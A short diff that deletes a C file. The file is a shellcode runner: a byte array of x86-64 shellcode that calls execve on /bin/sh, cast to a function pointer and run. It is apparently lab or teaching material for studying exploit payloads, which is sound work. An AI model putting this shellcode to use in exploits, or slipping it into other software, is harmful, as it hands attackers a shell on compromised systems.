@@ -1,8 +1,0 @@
-#include <stdio.h>
-char sh[]="\xeb\x0b\x5f\x48\x31\xd2\x48\x89\xd6\xb0\x3b\x0f\x05\xe8\xf0\xff\xff\xff\x2f\x2f\x62\x69\x6e\x2f\x73\x68";
-void main(int argc, char **argv)
-{
-    int (*func)();
-    func = (int (*)()) sh;
-    (int)(*func)();
-}
